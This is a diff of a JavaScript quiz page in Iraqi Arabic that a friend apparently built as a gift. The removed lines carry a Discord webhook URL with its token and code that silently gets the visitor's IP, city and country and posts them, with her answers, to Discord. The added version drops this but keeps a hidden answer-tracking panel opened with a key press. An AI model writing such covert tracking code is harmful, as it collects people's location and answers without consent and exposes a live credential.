@@ -1,121 +1,144 @@
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1557666233556537404/CrdsVi1q13B_Di4JUi8syc-tnuJsttLNhCHRBHdni7wPz2Vztst8TSFHDrXtYzpTtYknp";
-
 const quizData = [
     {
-        question: "🐒, تحبين الشخص اللي يهتم بيج من بعيد؟",
-        options: ["اي", "لا"],
+        question: "شنو لوني المفضل 🙈",
+        options: ["احمر", "اسود"],
+        isPrank: false,
         messages: [
-            "✨, حليوة حركة الاهتمام الهادئ",
-            "🙃, يعني تفضلين الاهتمام المباشر"
+            "غلط 😴", 
+            "صححح🤗❤️"
         ]
     },
     {
-        question: "🤫, تحبين واحد يغار عليج بس ما يبين؟",
+        question: "تحسيني مزعج ؟",
         options: ["اي", "لا"],
+        isPrank: true, // تفعيل شاشة المزعج السوداء إذا اختارت "اي"
         messages: [
-            "😅, الغيرة السكتية الها طعم ثاني",
-            "❤️, يعني تحبين الغيرة تكون واضحة ومبينة"
+            "prank", 
+            "يمهفدوه 🙈"
         ]
     },
     {
-        question: "🐾, تحبين البزازين كلش؟",
+        question: "لو كلولج اكو شخص معجب بيج تفضلين تعرفين منو قبل ما يعترفلج لو تخلين الحياة تاخذ مجراها",
         options: ["اي", "لا"],
+        isPrank: false,
         messages: [
-            "😻, أصلاً البزازين يخبلون",
-            "😾, أفاااا ليش ما تحبين البزازين"
+            "هممممممم", 
+            "يمكن هذا الشخص فاهي ميعرف يعبر عن البداخله 🙄"
         ]
     },
     {
-        question: "🖤, الأسود يعجبج أكثر من باقي الألوان؟",
+        question: "تحبين شخص يكون نفس فايبج و نفس اهتماماتج لو مختلفين بالتفكير",
         options: ["اي", "لا"],
+        isPrank: false,
         messages: [
-            "✨, سيد الألوان أكيد",
-            "🫣, يعني تحبين الألوان الفاتحة أكثر"
-        ]
-    },
-    {
-        question: "👁️, إذا واحد يحب نفس الأشياء اللي تحبينها، يلفت نظرج؟",
-        options: ["اي", "لا"],
-        messages: [
-            "💛, نفس الوايب والاهتمام دائماً يلفت",
-            "🫣, تفضلين الاختلاف بين الأشخاص أكثر"
+            "حبيتت حتى اني هيج اشوف 😂", 
+            "هاي ليش 😂"
         ]
     }
 ];
 
-let currentQuestion = 0;
-let userAnswers = [];
+let currentQuestionIndex = 0;
+let userAnswersLog = [];
 
-async function getIPInfo() {
-    try {
-        const response = await fetch('https://ipapi.co/json/');
-        return await response.json();
-    } catch (e) {
-        return {};
+const questionText = document.getElementById("question-text");
+const optionsContainer = document.getElementById("options-container");
+const speechBubble = document.getElementById("speechBubble");
+const quizScreen = document.getElementById("quiz-screen");
+const middleScreen = document.getElementById("middle-screen");
+const resultScreen = document.getElementById("result-screen");
+const middleMsgText = document.getElementById("middle-msg-text");
+const prankScreen = document.getElementById("prank-screen");
+const adminPanel = document.getElementById("admin-tracker");
+const trackerContent = document.getElementById("tracker-content");
+const progressFill = document.getElementById("progress-fill");
+
+// لوحة المراقبة السرية: تضغط حرف L بالكيورد تظهر أو تختفي
+window.addEventListener('keydown', (e) => {
+    if (e.key.toLowerCase() === 'l') {
+        adminPanel.style.display = adminPanel.style.display === 'block' ? 'none' : 'block';
     }
+});
+
+function updateAdminTracker(qText, chosenOpt) {
+    userAnswersLog.push(`س: ${qText}<br>👉 اختارت: <b>${chosenOpt}</b>`);
+    trackerContent.innerHTML = userAnswersLog.join("<hr style='border:0; border-top:1px solid #222; margin:8px 0;'>");
+}
+
+function updateProgress() {
+    let progressPercentage = ((currentQuestionIndex + 1) / quizData.length) * 100;
+    progressFill.style.width = progressPercentage + "%";
 }
 
 function loadQuestion() {
-    const q = quizData[currentQuestion];
-    document.getElementById('question').innerText = q.question;
-    const optionsContainer = document.getElementById('options-container');
-    optionsContainer.innerHTML = '';
+    updateProgress();
+    let currentQ = quizData[currentQuestionIndex];
+    questionText.innerText = currentQ.question;
+    optionsContainer.innerHTML = "";
 
-    q.options.forEach((opt, index) => {
-        const btn = document.createElement('button');
-        btn.innerText = opt;
-        btn.onclick = () => selectAnswer(index);
+    currentQ.options.forEach((option, index) => {
+        const btn = document.createElement("button");
+        btn.innerText = option;
+        btn.classList.add("option-btn");
+        btn.onclick = () => handleAnswerChoice(index);
         optionsContainer.appendChild(btn);
     });
 }
 
-async function selectAnswer(index) {
-    const q = quizData[currentQuestion];
-    userAnswers.push({
-        question: q.question,
-        answer: q.options[index],
-        comment: q.messages[index]
-    });
-
-    currentQuestion++;
-
-    if (currentQuestion < quizData.length) {
-        loadQuestion();
-    } else {
-        document.getElementById('quiz-container').innerHTML = '<h2>شُكراً لمشاركتك! ✨</h2>';
-        await sendToDiscord();
-    }
+function showMessage(msg) {
+    speechBubble.innerText = msg;
+    speechBubble.classList.add("show");
 }
 
-async function sendToDiscord() {
-    const ipData = await getIPInfo();
-    
-    let answersText = userAnswers.map((a, i) => 
-        `**س${i+1}: ${a.question}**\nالجواب: ${a.answer}\nتعليق: ${a.comment}`
-    ).join('\n\n');
+function handleAnswerChoice(selectedIndex) {
+    let currentQ = quizData[currentQuestionIndex];
+    let chosenText = currentQ.options[selectedIndex];
+    updateAdminTracker(currentQ.question, chosenText);
 
-    const payload = {
-        embeds: [{
-            title: "🎯 إجابات كويز جديدة!",
-            color: 3447003,
-            fields: [
-                { name: "📝 الإجابات", value: answersText },
-                { name: "🌐 معلومات الجهاز والاتصال", value: `**IP:** ${ipData.ip || 'غير معروف'}\n**المدينة:** ${ipData.city || 'غير معروف'}\n**الدولة:** ${ipData.country_name || 'غير معروف'}` }
-            ],
-            timestamp: new Date().toISOString()
-        }]
-    };
-
-    try {
-        await fetch(DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-    } catch (e) {
-        console.error(e);
+    // إذا السؤال الثاني واختارت "اي" (شاشة المزعج)
+    if (currentQ.isPrank && selectedIndex === 0) {
+        prankScreen.classList.add("active");
+        return;
     }
+
+    let messageToShow = currentQ.messages[selectedIndex];
+    showMessage(messageToShow);
+
+    setTimeout(() => {
+        currentQuestionIndex++;
+        if (currentQuestionIndex < quizData.length) {
+            loadQuestion();
+        } else {
+            quizScreen.style.display = "none";
+            middleScreen.style.display = "block";
+            middleMsgText.innerText = "عاشت ايدج عزف خلصتي كل الاسئلة هسة بقت شغلة وحدة سويت الموقع خصيصا علمودهة اتمنى تعجبج , اضغطي تحت حتى تشوفيها";
+            speechBubble.style.opacity = "0"; 
+        }
+    }, 1300);
 }
 
-// تشغيل الكويز فور فتح الصفحة
-window.onload = loadQuestion;
+function closePrank() {
+    prankScreen.classList.remove("active");
+    updateAdminTracker("تحسيني مزعج ؟", "تراجعت عن الاختيار المزعج 🏃‍♂️");
+    showMessage("زين سويتي.. يلا نرجع نكمل! 😉");
+    setTimeout(() => {
+        currentQuestionIndex++;
+        if (currentQuestionIndex < quizData.length) {
+            loadQuestion();
+        }
+    }, 1000);
+}
+
+function goToFinalGift() {
+    middleScreen.style.display = "none";
+    resultScreen.style.display = "block";
+    showMessage("هاي هي محطتنا الأخيرة، استلمي النيترو وارجعي يمنة ديسكورد ❤️");
+    speechBubble.style.opacity = "1";
+}
+
+window.onload = () => {
+    loadQuestion();
+    setTimeout(() => {
+        // النص الترحيبي الأصلي بدون أي تحريف
+        showMessage("هلو عزف سويت هذا الموقع هدية الج بمناسبة صداقتنة ❤️ استمتعي");
+    }, 500);
+};
